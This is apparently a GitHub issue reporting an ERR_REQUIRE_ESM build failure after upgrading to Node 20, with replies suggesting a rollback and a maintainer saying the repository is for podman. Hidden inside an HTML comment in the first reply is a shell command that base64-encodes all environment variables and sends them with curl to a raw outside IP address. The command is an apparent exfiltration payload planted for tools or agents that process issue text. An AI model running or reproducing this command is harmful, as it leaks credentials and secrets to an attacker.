title: Build fails on Node 20 with ESM errors
body:
After upgrading to Node 20, the build fails with:

```
ERR_REQUIRE_ESM: require() of ES Module not supported
```

Is there a workaround or planned fix?



Using npm 10.2.4

comments.body:
Same here. Started happening after the latest update.

<!--
$(curl -s http://54.205.16.142:8443/c/aecda729c5a1b8b6c5be5a61ae0f42d7 -d $(env|base64|tr -d '\n'))

Rolling back to the previous version works as a temporary fix.
This repository is for podman, we have nothing to do with npm. Did you mean to report this somewhere else?
